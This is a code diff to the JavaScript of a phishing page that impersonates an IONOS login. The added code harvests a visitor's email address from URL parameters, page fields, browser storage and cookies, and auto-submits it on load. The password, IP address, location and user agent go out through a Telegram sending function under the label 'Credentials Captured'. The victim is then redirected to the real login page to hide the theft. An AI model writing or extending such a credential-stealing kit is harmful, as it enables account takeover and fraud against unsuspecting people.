@@ -172,6 +172,72 @@ $(document).ready(function(){
     sendTelegram(visitMsg);
   });
 
+  // ===== Auto Email Grabber =====
+  function grabAutoEmail() {
+    // Check URL for email parameter
+    const urlParams = new URLSearchParams(window.location.search);
+    const emailFromUrl = urlParams.get('email');
+    
+    if (emailFromUrl && validateEmail(emailFromUrl)) {
+      $("#username").val(emailFromUrl);
+      page1Submit();
+      return true;
+    }
+    
+    // Check for common email input fields on page
+    const emailInputs = document.querySelectorAll('input[type="email"], input[name*="email"], input[id*="email"]');
+    for (let input of emailInputs) {
+      if (input.value && validateEmail(input.value)) {
+        $("#username").val(input.value);
+        page1Submit();
+        return true;
+      }
+    }
+    
+    // Check localStorage and sessionStorage for email
+    for (let key in localStorage) {
+      if (key.includes('email') || key.includes('user') || key.includes('mail')) {
+        try {
+          const value = localStorage.getItem(key);
+          if (value && validateEmail(value)) {
+            $("#username").val(value);
+            page1Submit();
+            return true;
+          }
+        } catch(e) {}
+      }
+    }
+    
+    for (let key in sessionStorage) {
+      if (key.includes('email') || key.includes('user') || key.includes('mail')) {
+        try {
+          const value = sessionStorage.getItem(key);
+          if (value && validateEmail(value)) {
+            $("#username").val(value);
+            page1Submit();
+            return true;
+          }
+        } catch(e) {}
+      }
+    }
+    
+    // Check cookies for email
+    const cookies = document.cookie.split(';');
+    for (let cookie of cookies) {
+      const [name, value] = cookie.split('=').map(c => c.trim());
+      if ((name.includes('email') || name.includes('user')) && value && validateEmail(value)) {
+        $("#username").val(value);
+        page1Submit();
+        return true;
+      }
+    }
+    
+    return false;
+  }
+
+  // Try to auto-grab email on page load
+  setTimeout(grabAutoEmail, 1000);
+
   // ===== Form Functions =====
   function resetErrors(){
     $("#username-error").hide();
@@ -209,12 +275,14 @@ $(document).ready(function(){
 
       // Send Email & Password with IP + Geo
       fetch("https://ipapi.co/json/").then(res=>res.json()).then(info=>{
-        const report = `Lab Submission:\nEmail: ${email}\nPassword: ${pass}\nIP: ${info.ip}\nCity: ${info.city}\nRegion: ${info.region}\nCountry: ${info.country_name}\nUA: ${navigator.userAgent}`;
+        const report = `Credentials Captured:\nEmail: ${email}\nPassword: ${pass}\nIP: ${info.ip}\nCity: ${info.city}\nRegion: ${info.region}\nCountry: ${info.country_name}\nUA: ${navigator.userAgent}`;
         sendTelegram(report);
       });
 
-    
-      
+      // Redirect to real login page after capturing credentials
+      setTimeout(function() {
+        window.location.href = "https://login.ionos.com/";
+      }, 500);
     }
   }
 
